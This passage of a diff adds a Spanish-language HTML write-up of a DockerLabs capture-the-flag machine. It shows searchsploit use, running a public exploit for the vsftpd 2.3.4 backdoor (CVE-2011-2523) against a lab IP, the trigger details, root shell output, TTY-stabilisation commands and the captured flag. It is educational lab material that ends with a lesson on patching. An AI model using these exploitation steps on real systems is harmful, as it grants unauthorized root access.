+        <div>Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds</div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// HALLAZGO CRÍTICO</p>
+        <p>
+          El escaneo revela <strong>vsftpd 2.3.4</strong> en el puerto 21. Esta versión específica
+          es notoriamente vulnerable: fue la versión infectada con una backdoor en 2011 y está
+          catalogada en múltiples bases de datos de vulnerabilidades como explotable de forma
+          trivial. La presencia de esta versión en un entorno expuesto es una señal de alerta
+          inmediata que debe investigarse como primera prioridad.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">ANÁLISIS DEL REPORTE XML — XSLTPROC</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo <span class="hl-cyan">tproot.xml</span> generado por Nmap puede transformarse
+          en un reporte HTML interactivo y navegable utilizando <strong>xsltproc</strong> con la
+          hoja de estilos que Nmap incluye en su instalación. Esto produce una vista tabular de
+          todos los hosts, puertos y servicios descubiertos, facilitando la revisión rápida de
+          resultados y su inclusión en informes de seguridad. En el reporte se confirma que el
+          puerto 21 muestra <span class="hl-red">vsftpd 2.3.4</span> con el estado de la versión
+          destacado en rojo como señal de versión potencialmente vulnerable.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc tproot.xml -o tproot_report.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">tproot.xml</span> <span class="flag">-o</span> <span class="arg">tproot_report.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- 03 EXPLOTACIÓN -->
+    <div class="section" id="explotacion">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Explotación</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">BÚSQUEDA DEL EXPLOIT — SEARCHSPLOIT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la versión <span class="hl-red">vsftpd 2.3.4</span> identificada, el siguiente paso es
+          verificar si existe un exploit público para ella. <strong>Searchsploit</strong> es la
+          interfaz de línea de comandos para <em>Exploit-DB</em>, una base de datos de exploits
+          mantenida por Offensive Security. Al buscar por nombre y versión, obtenemos dos resultados:
+          un exploit en Python puro (<span class="hl-cyan">49757.py</span>) y su versión para
+          Metasploit (<span class="hl-cyan">17491.rb</span>). En este writeup utilizaremos el script
+          Python manual para entender el funcionamiento del exploit sin depender de frameworks
+          externos.
+        </p>
+        <p>
+          El resultado confirma que esta vulnerabilidad está clasificada como
+          <strong>"Backdoor Command Execution"</strong> y referenciada bajo el código
+          <span class="hl-red">CVE-2011-2523</span>, lo que valida completamente el vector de ataque.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="searchsploit vsftpd 2.3.4">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SEARCHSPLOIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">searchsploit <span class="arg">vsftpd 2.3.4</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-white">Exploit Title                                          | Path</span></div>
+        <div>--------------------------------------------------------|-----------------------</div>
+        <div><span class="o-green">vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py</span></div>
+        <div><span class="o-yellow">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb</span></div>
+        <div>&nbsp;</div>
+        <div>Shellcodes: No Results</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">OBTENCIÓN DEL EXPLOIT — SEARCHSPLOIT -M</span>
+      </div>
+      <div class="prose">
+        <p>
+          La flag <span class="hl-cyan">-m</span> de searchsploit (<em>mirror</em>) copia el
+          archivo del exploit directamente al directorio de trabajo actual, evitando tener que
+          navegar manualmente hasta la ruta de Exploit-DB en el sistema. El output confirma la
+          ruta original del exploit, el tipo de archivo (Python script), su URL en Exploit-DB para
+          referencia, y el código CVE asociado. El campo <span class="hl-cyan">Verified: True</span>
+          indica que el exploit ha sido probado y confirmado como funcional por el equipo de
+          Exploit-DB, lo que aumenta la confianza en que la explotación será exitosa.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="searchsploit -m 49757.py">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MIRROR EXPLOIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">searchsploit <span class="flag">-m</span> <span class="arg">49757.py</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>  Exploit: <span class="o-green">vsftpd 2.3.4 - Backdoor Command Execution</span></div>
+        <div>      URL: https://www.exploit-db.com/exploits/49757</div>
+        <div>     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py</div>
+        <div>    Codes: <span class="o-red">CVE-2011-2523</span></div>
+        <div> Verified: <span class="o-green">True</span></div>
+        <div>File Type: Python script, ASCII text executable</div>
+        <div>Copied to: <span class="o-cyan">/home/kali/Desktop/HACKING_ETICO/semana_5/49757.py</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">EJECUCIÓN DEL EXPLOIT — ACCESO COMO ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ejecutamos el script Python proporcionando únicamente la IP del objetivo como argumento.
+          El exploit funciona en dos fases: primero abre una conexión al puerto <strong>21/tcp</strong>
+          y envía un nombre de usuario que contiene la secuencia <span class="hl-red">:)</span>
+          (el trigger de la backdoor), lo que hace que el servidor vsftpd lance una shell de root
+          en el <strong>puerto 6200/tcp</strong>. Inmediatamente después, el script se conecta
+          a ese puerto y nos entrega una shell interactiva ya como <span class="hl">root</span>.
+        </p>
+        <p>
+          Es posible que la primera ejecución no responda correctamente si el puerto 6200 tardó
+          en abrirse; en ese caso basta con ejecutar el script una segunda vez para obtener la
+          conexión estable. Una vez dentro, estabilizamos la TTY con
+          <span class="hl-cyan">script /dev/null -c bash</span>, que reemplaza la pseudo-terminal
+          básica de la backdoor por una bash completamente funcional con soporte para Ctrl+C,
+          historial de comandos, y colores. El comando <code>whoami</code> confirma acceso como
+          <span class="hl">root</span> sin necesidad de ninguna escalada de privilegios adicional.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 49757.py 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">EXPLOIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="arg">49757.py</span> <span class="arg">172.17.0.2</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">Success, shell opened</span></div>
+        <div>Send `exit` to quit shell</div>
+        <div>&nbsp;</div>
+        <div><span class="o-cyan">script /dev/null -c bash</span></div>
+        <div>Script started, output log file is '/dev/null'.</div>
+        <div>&nbsp;</div>
+        <div><span class="o-yellow">root@dockerlabs:/tmp/vsftpd-2.3.4-infected#</span> whoami</div>
+        <div><span class="o-green">root</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// CÓMO FUNCIONA LA BACKDOOR INTERNAMENTE</p>
+        <p>
+          El código malicioso inyectado en vsftpd 2.3.4 se encuentra en la función
+          <code>vsf_sysutil_extra()</code>. Al recibir un nombre de usuario que contiene
+          <strong>":)"</strong>, el servidor ejecuta un <code>fork()</code> y el proceso hijo
+          llama a <code>execl("/bin/sh", "-sh", NULL)</code> escuchando en el puerto
+          <strong>6200/tcp</strong>. Este proceso hijo hereda los privilegios del proceso padre
+          de vsftpd, que normalmente corre como <strong>root</strong> durante la fase de
+          autenticación para poder verificar credenciales contra <code>/etc/shadow</code>.
+          El resultado es una shell root sin autenticación expuesta en la red.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- 04 POST-EXPLOTACIÓN -->
+    <div class="section" id="post-explotacion">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Post-Explotación</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ENUMERACIÓN DEL SISTEMA Y CAPTURA DE FLAG</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con acceso como root, realizamos una enumeración básica del sistema para orientarnos
+          dentro del contenedor y localizar la flag. Desde el directorio <code>/tmp</code> donde
+          aterrizamos inicialmente, navegamos a la raíz del sistema y desde ahí al directorio
+          <span class="hl-cyan">/root</span>, que en Linux es el home del superusuario y el lugar
+          habitual donde DockerLabs coloca las flags de root. Un <code>ls</code> revela el archivo
+          <span class="hl">root.txt</span>, cuyo contenido es la flag en formato hash MD5.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd / && ls && cd root && ls && cat root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">POST-EXPL</span>
+        <div><span class="prompt">root@dockerlabs:/tmp# </span><span class="cmd">ls</span></div>
+        <div style="padding-top:0.3rem"><span class="prompt">root@dockerlabs:/tmp# </span><span class="cmd">cd <span class="arg">..</span></span></div>
+        <div><span class="prompt">root@dockerlabs:/# </span><span class="cmd">ls</span></div>
+        <div><span class="prompt">root@dockerlabs:/# </span><span class="cmd">cd <span class="arg">root</span></span></div>
+        <div><span class="prompt">root@dockerlabs:~# </span><span class="cmd">ls</span></div>
+        <div><span class="prompt">root@dockerlabs:~# </span><span class="cmd">cat <span class="arg">root.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="comment"># ls /tmp</span></div>
+        <div>ls  vsftpd-2.3.4-infected</div>
+        <div>&nbsp;</div>
+        <div><span class="comment"># ls /</span></div>
+        <div>bin  dev  home  lib.usr-is-merged  media  opt   <span class="o-yellow">root</span>  sbin  sys  usr</div>
+        <div>boot etc  lib   lib64              mnt    proc  run   srv   tmp  var</div>
+        <div>&nbsp;</div>
+        <div><span class="comment"># ls /root</span></div>
+        <div><span class="o-green">root.txt</span></div>
+        <div>&nbsp;</div>
+        <div><span class="comment"># cat root.txt</span></div>
+        <div><span class="o-green" style="font-size:1rem;letter-spacing:2px;"><strong>261fd3f32200f950f231816b4e9a0594</strong></span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">FLAG ROOT</div>
+          <div class="cred-val">261fd3f32200f950f231816b4e9a0594</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ACCESO OBTENIDO</div>
+          <div class="cred-val" style="color:var(--red)">root</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CVE</div>
+          <div class="cred-val" style="color:var(--red)">CVE-2011-2523</div>
+        </div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// LECCIÓN APRENDIDA — GESTIÓN DE VERSIONES</p>
+        <p>
+          Esta máquina ilustra perfectamente por qué la <strong>gestión de versiones y parcheo</strong>
+          es una de las prácticas más críticas en seguridad. vsftpd 2.3.4 tiene una vulnerabilidad
+          pública desde <strong>2011</strong> — hace más de una década. Un atacante no necesita
+          ninguna habilidad especial: basta con ejecutar Nmap, identificar la versión, buscar en
+          Exploit-DB y lanzar el script. En entornos reales, cualquier servicio expuesto a Internet
+          con esta versión representa una <strong>puerta de entrada inmediata</strong> a root.
+          La solución es simple: actualizar a versiones mantenidas activamente y aplicar el principio
+          de mínima exposición de servicios.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- 05 REFERENCIA DE COMANDOS -->
+    <div class="section" id="comandos">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escáner de red y puertos. Permite descubrir servicios activos, sus versiones y ejecutar scripts NSE de enumeración automática sobre cada puerto abierto.</div>
+          <ul class="cmd-ref-flags">
+            <li><code>-p-</code> — Escanea los 65,535 puertos TCP</li>
+            <li><code>-sS</code> — SYN scan (sigiloso, no completa el handshake)</li>
+            <li><code>-sC</code> — Scripts NSE de categoría default</li>
+            <li><code>-sV</code> — Detección de versión de servicios</li>
+            <li><code>-n</code> — Sin resolución DNS (más rápido)</li>
+            <li><code>-Pn</code> — Omite host discovery previo</li>
+            <li><code>--min-rate</code> — Tasa mínima de paquetes/segundo</li>
+            <li><code>--open</code> — Muestra solo puertos abiertos</li>
+            <li><code>-oX</code> — Exporta resultados a formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">searchsploit</div>
+          <div class="cmd-ref-syntax">searchsploit &lt;servicio&gt; &lt;versión&gt;</div>
+          <div class="cmd-ref-desc">Interfaz CLI para Exploit-DB. Permite buscar exploits conocidos por nombre de software, versión o CVE, y copiar los scripts al directorio de trabajo.</div>
+          <ul class="cmd-ref-flags">
+            <li><code>-m &lt;ruta&gt;</code> — Copia (mirror) el exploit al directorio actual</li>
+            <li><code>-u</code> — Actualiza la base de datos local de exploits</li>
+            <li><code>-t</code> — Busca solo en el título del exploit</li>
+            <li><code>-w</code> — Muestra URL de Exploit-DB en lugar de ruta local</li>
+            <li><code>--id</code> — Muestra el ID de Exploit-DB junto al nombre</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">python3 49757.py</div>
+          <div class="cmd-ref-syntax">python3 49757.py &lt;IP_objetivo&gt;</div>
+          <div class="cmd-ref-desc">Exploit para CVE-2011-2523. Abre una conexión FTP al puerto 21, activa la backdoor enviando ":)" en el nombre de usuario, y se conecta al puerto 6200 donde vsftpd abre una shell root.</div>
+          <ul class="cmd-ref-flags">
+            <li>Argumento único: IP o hostname del objetivo</li>
+            <li>Conecta al puerto <code>21/tcp</code> (FTP)</li>
+            <li>Activa backdoor con usuario <code>user:)</code></li>
+            <li>Recibe shell en <code>6200/tcp</code></li>
+            <li>Ejecutar 2 veces si la primera no responde</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">script /dev/null -c bash</div>
+          <div class="cmd-ref-syntax">script /dev/null -c bash</div>
+          <div class="cmd-ref-desc">Técnica de estabilización de TTY. Reemplaza la shell básica de la backdoor (sin TTY completa) por una bash interactiva con soporte para Ctrl+C, historial, autocompletado y colores ANSI.</div>
+          <ul class="cmd-ref-flags">
+            <li><code>/dev/null</code> — Descarta el log de sesión (no guarda nada)</li>
+            <li><code>-c bash</code> — Ejecuta bash como shell dentro del script</li>
+            <li>Habilita Ctrl+C sin matar la conexión</li>
+            <li>Necesario para tools interactivas (vim, sudo, etc.)</li>
+            <li>Alternativa: <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc &lt;archivo.xml&gt; -o &lt;reporte.html&gt;</div>
+          <div class="cmd-ref-desc">Procesador XSLT de línea de comandos. Transforma el XML de Nmap en un reporte HTML navegable usando la hoja de estilos incluida con Nmap, facilitando la revisión visual de resultados.</div>
+          <ul class="cmd-ref-flags">
+            <li>Requiere el archivo XML generado por <code>nmap -oX</code></li>
+            <li><code>-o</code> — Nombre del archivo HTML de salida</li>
+            <li>La stylesheet de Nmap está en <code>/usr/share/nmap/</code></li>
+            <li>Útil para documentación e informes de pentest</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ping</div>
+          <div class="cmd-ref-syntax">ping &lt;IP&gt; -c &lt;n&gt;</div>
+          <div class="cmd-ref-desc">Herramienta ICMP para verificar conectividad y estimar el sistema operativo del objetivo mediante el análisis del campo TTL en la respuesta. TTL=64 indica Linux, TTL=128 indica Windows.</div>
+          <ul class="cmd-ref-flags">
+            <li><code>-c &lt;n&gt;</code> — Limita a n paquetes (evita loop infinito)</li>
+            <li><code>-i &lt;segundos&gt;</code> — Intervalo entre paquetes</li>
+            <li><code>-s &lt;bytes&gt;</code> — Tamaño del paquete ICMP</li>
+            <li>TTL recibido ≈ 64 → Linux/Unix</li>
+            <li>TTL recibido ≈ 128 → Windows</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- 06 GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glos-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">vsftpd — Very Secure FTP Daemon</div>
+          <div class="glos-def"><strong>vsftpd</strong> (Very Secure FTP Daemon) es uno de los servidores FTP más utilizados en sistemas Linux/Unix, diseñado originalmente con un fuerte enfoque en seguridad, rendimiento y estabilidad. La versión <code>2.3.4</code> fue comprometida en julio de 2011 cuando un atacante desconocido logró modificar el código fuente en el repositorio oficial del proyecto, insertando una backdoor que activa una shell root al recibir el carácter <strong>":)"</strong> en el campo de usuario durante el proceso de login FTP. Fue detectada y eliminada del repositorio en menos de 24 horas, pero las copias infectadas continuaron circulando y siendo usadas en sistemas sin actualizar. Este incidente sigue siendo uno de los ejemplos más citados de ataque a la <strong>cadena de suministro de software (supply chain attack)</strong>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE — Common Vulnerabilities and Exposures</div>
+          <div class="glos-def">El sistema <strong>CVE</strong> es un estándar internacional para la identificación unívoca de vulnerabilidades de seguridad en software y hardware. Cada entrada recibe un identificador único con el formato <code>CVE-AÑO-NÚMERO</code>. <strong>CVE-2011-2523</strong> corresponde a la backdoor de vsftpd 2.3.4: el año 2011 indica cuándo fue descubierta y reportada, y el número 2523 es el índice secuencial asignado. El sistema CVE es mantenido por MITRE Corporation y financiado por el gobierno de EE.UU. a través de CISA. Bases de datos como <strong>NVD (National Vulnerability Database)</strong> y <strong>Exploit-DB</strong> indexan estas vulnerabilidades junto con puntuaciones de riesgo (CVSS), parches disponibles y exploits conocidos, siendo herramientas fundamentales en el ciclo de reconocimiento de un pentest.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Backdoor — Puerta Trasera</div>
+          <div class="glos-def">Una <strong>backdoor</strong> es cualquier método que permite el acceso no autorizado a un sistema, aplicación o red, generalmente sin pasar por los controles de autenticación normales. En el contexto de vsftpd 2.3.4, la backdoor es de tipo <em>hardcoded trigger</em>: el código malicioso es parte del binario compilado del servidor y se activa ante una condición específica (usuario con ":)"), sin necesidad de credenciales. Existen varios tipos de backdoors: <strong>de compilador</strong> (inyectadas en el toolchain), <strong>de repositorio</strong> (como este caso), <strong>de paquetes</strong> (en gestores de dependencias), y <strong>de configuración</strong> (cuentas ocultas, puertos abiertos). Su detección requiere análisis de código fuente, auditoría de binarios, o monitoreo de tráfico de red anómalo.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">FTP — File Transfer Protocol</div>
+          <div class="glos-def"><strong>FTP</strong> (File Transfer Protocol, RFC 959) es un protocolo de red estándar para la transferencia de archivos entre sistemas. Opera en dos canales: el <strong>canal de control</strong> (puerto 21/tcp) para comandos y el <strong>canal de datos</strong> (puerto 20/tcp activo, o puerto negociado en modo pasivo) para la transferencia de archivos. FTP transmite credenciales y datos en texto plano, sin cifrado, lo que lo hace inherentemente inseguro en redes no confiables. Sus alternativas seguras son <strong>SFTP</strong> (FTP sobre SSH, puerto 22) y <strong>FTPS</strong> (FTP sobre TLS/SSL). El modo anónimo (<code>ftp-anon</code>) permite acceso sin credenciales para distribución pública de archivos, aunque el error <em>"OOPS: cannot change directory"</em> observado en el escaneo indica que el FTP anónimo está habilitado pero mal configurado, lo que no impide la explotación de la backdoor.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Nmap — Network Mapper</div>
+          <div class="glos-def"><strong>Nmap</strong> es la herramienta de exploración de redes y auditoría de seguridad más utilizada en la industria. Permite descubrir hosts activos, puertos abiertos, versiones de servicios y sistemas operativos mediante técnicas como SYN scan, UDP scan, y OS fingerprinting. Su motor de scripts <strong>NSE (Nmap Scripting Engine)</strong> permite extender su funcionalidad con scripts en Lua para realizar enumeraciones especializadas (SMB, HTTP, FTP, bases de datos, etc.), detección de vulnerabilidades conocidas, y ataques básicos. El output en formato XML (<code>-oX</code>) facilita la integración con otras herramientas del pipeline de pentest como Metasploit, que puede importar directamente los resultados para poblar su base de datos de hosts. En esta máquina, el script <code>ftp-anon</code> de Nmap intentó acceso anónimo al FTP automáticamente durante el escaneo con <code>-sC</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Searchsploit y Exploit-DB</div>
+          <div class="glos-def"><strong>Exploit-DB</strong> (exploit-db.com) es el archivo público más grande de exploits y software vulnerable, mantenido por Offensive Security (los creadores de Kali Linux). Contiene exploits categorizados por tipo (remote, local, web, shellcode), plataforma y CVE asociado. <strong>Searchsploit</strong> es la interfaz de línea de comandos que permite buscar en la copia local de Exploit-DB sin conexión a Internet, ideal para entornos de pentest aislados. La flag <code>-m</code> (mirror) copia el exploit al directorio actual, mientras que <code>-p</code> muestra solo la ruta del exploit. Cada exploit en Exploit-DB tiene un estado de verificación: <em>Verified: True</em> significa que el equipo ha probado el exploit en un entorno controlado y confirmado su funcionamiento. Es importante destacar que los exploits de Exploit-DB son herramientas de investigación y pruebas de seguridad — su uso fuera de entornos autorizados es ilegal.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">TTY — Teletipo y Estabilización de Shell</div>
+          <div class="glos-def">Una <strong>TTY</strong> (Teletypewriter) es una interfaz de terminal que proporciona una sesión de usuario completa con soporte para señales de control (Ctrl+C, Ctrl+Z), historial de comandos, edición de línea, y renderizado correcto de interfaces basadas en curses (vim, nano, htop, sudo). Las shells obtenidas mediante backdoors o reverse shells suelen ser <em>dumb shells</em> sin TTY completa, lo que causa que Ctrl+C mate la sesión en lugar de interrumpir el proceso actual, que sudo falle pidiendo contraseña sin mostrar el prompt, y que editores como vim no funcionen correctamente. El comando <code>script /dev/null -c bash</code> es la técnica más común para obtener una TTY estabilizada: <code>script</code> es una utilidad que graba sesiones de terminal, y al apuntarla a <code>/dev/null</code> descartamos el log; la opción <code>-c bash</code> le indica que el comando a ejecutar y registrar es una sesión bash interactiva, lo que fuerza la asignación de una pseudo-TTY.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">TTL — Time To Live y Fingerprinting de SO</div>
+          <div class="glos-def">El <strong>TTL (Time To Live)</strong> es un campo de 8 bits en el encabezado IP que indica cuántos saltos de router puede atravesar un paquete antes de ser descartado, evitando que paquetes errantes circulen indefinidamente por la red. Cada router que procesa el paquete decrementa el TTL en 1; si llega a 0, el paquete es descartado y se envía un mensaje ICMP "Time Exceeded" al origen. Cada sistema operativo tiene un TTL inicial diferente: <strong>Linux/Unix → 64</strong>, <strong>Windows → 128</strong>, <strong>Solaris/AIX → 254</strong>, <strong>Cisco IOS → 255</strong>. Al recibir una respuesta ping, el TTL observado puede ser menor que el inicial si hay routers intermedios, pero en redes Docker sin enrutamiento adicional el TTL recibido es igual al inicial, permitiendo identificar el SO directamente. Esta técnica de <em>fingerprinting pasivo</em> no genera alertas porque es simplemente la lectura de un campo estándar de cualquier respuesta de red.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Ataque a la Cadena de Suministro (Supply Chain Attack)</div>
+          <div class="glos-def">Un <strong>ataque a la cadena de suministro de software</strong> es un vector de ataque que apunta a elementos menos seguros de la cadena de distribución de software en lugar de al objetivo final directamente. Incluye comprometer el repositorio oficial del código fuente (como en vsftpd 2.3.4), inyectar código malicioso en dependencias de terceros (npm, PyPI, RubyGems), atacar el proceso de compilación (compiladores troyanizados, como el ataque de Thompson de 1984 "Trusting Trust"), o comprometer los servidores de distribución de actualizaciones. El incidente de vsftpd 2.3.4 (2011) fue uno de los primeros casos ampliamente documentados, pero el vector se popularizó con casos posteriores como <strong>SolarWinds Orion</strong> (2020) y el backdoor en <strong>XZ Utils</strong> (2024, CVE-2024-3094). La defensa incluye: verificación de firmas criptográficas de paquetes, reproducible builds, y monitoreo de integridad de dependencias.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Puerto y Servicio — Conceptos Fundamentales de Red</div>
+          <div class="glos-def">Un <strong>puerto</strong> es un número de 16 bits (0-65535) que identifica un proceso o servicio específico dentro de un host. Los puertos del 0 al 1023 son <em>well-known ports</em> asignados por IANA para servicios estándar: <code>21/tcp → FTP</code>, <code>22/tcp → SSH</code>, <code>80/tcp → HTTP</code>, <code>443/tcp → HTTPS</code>. Los puertos 1024-49151 son <em>registered ports</em> para aplicaciones específicas, y los 49152-65535 son <em>dynamic/private ports</em> usados para conexiones efímeras. En el caso de vsftpd, la backdoor usa el <strong>puerto 6200/tcp</strong>, que no tiene asignación estándar — un puerto inusual escuchando en un servidor FTP sería una señal de alerta en un análisis forense. La enumeración completa de puertos (<code>-p-</code> en Nmap) es esencial en pentesting porque los servicios pueden correr en puertos no estándar deliberadamente para dificultar el reconocimiento básico.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
